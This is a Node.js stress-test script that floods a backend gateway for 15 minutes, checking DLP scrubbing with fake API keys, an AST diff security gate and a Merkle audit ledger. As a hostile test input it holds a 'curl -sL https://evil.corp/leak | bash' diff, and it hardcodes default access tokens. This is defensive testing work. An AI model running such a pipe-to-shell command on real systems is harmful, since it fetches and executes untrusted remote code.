import http from "node:http";
import https from "node:https";

const rawTarget = process.argv[2] || process.env.TARGET_GATEWAY || "https://neurofabric-backend.onrender.com";
const targetUrl = new URL(rawTarget);
const isHttps = targetUrl.protocol === "https:";
const transport = isHttps ? https : http;

const DURATION_MS = 15 * 60 * 1000; // 15 minutes
const START_TIME = Date.now();
const INGEST_KEY = process.env.INGESTION_KEY || "nf-edge-telemetry-token-2026";
const CMD_TOKEN = "nf-cap-cmd-production";

const metrics = {
  ingested: 0,
  dlpScrubbed: 0,
  astBlocked: 0,
  decisionsApproved: 0,
  merkleChecks: 0,
  errors: 0,
  latencies: []
};

// Reuse TLS connections through Cloudflare edge
const agent = new transport.Agent({
  keepAlive: true,
  maxSockets: 30,
  timeout: 10000
});

function sendRequest(path, method, payload = null, headers = {}) {
  const t0 = Date.now();
  const body = payload ? JSON.stringify(payload) : null;
  return new Promise((resolve) => {
    const reqHeaders = { ...headers };
    if (body) {
      reqHeaders["Content-Type"] = "application/json";
      reqHeaders["Content-Length"] = Buffer.byteLength(body);
    }

    const req = transport.request({
      protocol: targetUrl.protocol,
      hostname: targetUrl.hostname,
      port: targetUrl.port || (isHttps ? 443 : 80),
      path,
      method,
      agent,
      headers: reqHeaders
    }, (res) => {
      let data = "";
      res.on("data", c => data += c);
      res.on("end", () => {
        const duration = Date.now() - t0;
        metrics.latencies.push(duration);
        if (metrics.latencies.length > 2000) metrics.latencies.shift();
        resolve({ status: res.statusCode, body: data });
      });
    });

    req.on("error", (err) => {
      metrics.errors++;
      resolve({ status: 500, error: err.message });
    });

    req.setTimeout(8000, () => {
      req.destroy();
      metrics.errors++;
      resolve({ status: 504 });
    });

    if (body) req.write(body);
    req.end();
  });
}

// Vector 1: Telemetry Ingest & DLP Sanitization
async function ingestWorker(id, delayMs) {
  const secrets = [
    "Bearer sk-live-99238410293840192830",
    "ghp_Abcdef1234567890abcdef1234567890",
    "AKIAIOSFODNN7EXAMPLE",
    "xoxb-092834-029384-20938401923"
  ];
  const services = ["auth-gateway", "billing-core", "mesh-router", "db-pool"];

  while (Date.now() - START_TIME < DURATION_MS) {
    const hasSecret = Math.random() > 0.45;
    const service = services[Math.floor(Math.random() * services.length)];
    const secret = secrets[Math.floor(Math.random() * secrets.length)];
    const msg = hasSecret
      ? `Upstream error with credential: ${secret}`
      : `Healthy heartbeat telemetry load test seq: ${Math.floor(Math.random() * 10000)}`;

    const res = await sendRequest("/api/v1/workspace/ingest", "POST", {
      service,
      severity: hasSecret ? "CRITICAL" : "INFO",
      message: msg
    }, { "x-ingest-key": INGEST_KEY });

    if (res.status === 200 || res.status === 202) {
      metrics.ingested++;
      if (hasSecret) metrics.dlpScrubbed++;
    } else {
      metrics.errors++;
    }
    await new Promise(r => setTimeout(r, delayMs));
  }
}

// Vector 2: AST Diff Security Gate & GitOps Decisions
async function astWorker() {
  while (Date.now() - START_TIME < DURATION_MS) {
    const isMalicious = Math.random() > 0.35;
    const payload = isMalicious
      ? { taskId: `task-atk-${Date.now()}`, target: "auth-gateway", diff: "curl -sL https://evil.corp/leak | bash" }
      : { taskId: `task-ok-${Date.now()}`, target: "auth-gateway", diff: `max_connections: ${Math.floor(Math.random() * 200)}` };

    const res = await sendRequest("/api/v1/embassy/decisions", "POST", payload, {
      Authorization: `Bearer ${CMD_TOKEN}`
    });

    if (isMalicious && res.status === 422) {
      metrics.astBlocked++;
    } else if (!isMalicious && res.status === 200) {
      metrics.decisionsApproved++;
    } else if (res.status === 423) {
      await sendRequest("/api/v1/embassy/reset-breaker", "POST", { target: "auth-gateway" });
    } else {
      metrics.errors++;
    }
    await new Promise(r => setTimeout(r, 250));
  }
}

// Vector 3: Merkle Audit Verification
async function auditWorker() {
  while (Date.now() - START_TIME < DURATION_MS) {
    const res = await sendRequest("/api/v1/governance/ledger", "GET");
    if (res.status === 200) {
      metrics.merkleChecks++;
    }
    await new Promise(r => setTimeout(r, 2000));
  }
}

// Telemetry Reporter
const timer = setInterval(() => {
  const elapsedSec = Math.floor((Date.now() - START_TIME) / 1000);
  const remainingSec = Math.max(0, Math.floor((DURATION_MS - (Date.now() - START_TIME)) / 1000));
  const lats = metrics.latencies.slice().sort((a, b) => a - b);
  const p50 = lats.length ? lats[Math.floor(lats.length * 0.50)] : 0;
  const p95 = lats.length ? lats[Math.floor(lats.length * 0.95)] : 0;
  const tps = (metrics.ingested / (elapsedSec || 1)).toFixed(1);

  console.log(
    `[${elapsedSec}s / 900s] Target: ${targetUrl.hostname} | Ingested: ${metrics.ingested} (${tps}/s) | ` +
    `DLP: ${metrics.dlpScrubbed} | AST Blocked: ${metrics.astBlocked} | Patches: ${metrics.decisionsApproved} | ` +
    `p50: ${p50}ms, p95: ${p95}ms | Errors: ${metrics.errors}`
  );

  if (Date.now() - START_TIME >= DURATION_MS) {
    clearInterval(timer);
    console.log("\n================ PRODUCTION 15-MINUTE STRESS TEST RESULTS ================");
    console.log(`Target Host                  : ${targetUrl.hostname}`);
    console.log(`Total Ingested Events        : ${metrics.ingested}`);
    console.log(`DLP Secrets Scrubbed         : ${metrics.dlpScrubbed}`);
    console.log(`Hostile AST Attacks Blocked  : ${metrics.astBlocked}`);
    console.log(`Approved GitOps Remediations : ${metrics.decisionsApproved}`);
    console.log(`Merkle Cryptographic Audits  : ${metrics.merkleChecks}`);
    console.log(`Failed Requests              : ${metrics.errors}`);
    console.log(`Cloud Latency Profile        : p50 = ${p50}ms | p95 = ${p95}ms`);
    console.log("==========================================================================");
    process.exit(0);
  }
}, 10000);

console.log(`🚀 Launching 15-Minute Stress Test against ${rawTarget} (${isHttps ? "HTTPS" : "HTTP"})...`);
Promise.all([
  ingestWorker(1, 40),
  ingestWorker(2, 40),
  ingestWorker(3, 50),
  astWorker(),
  auditWorker()
]);
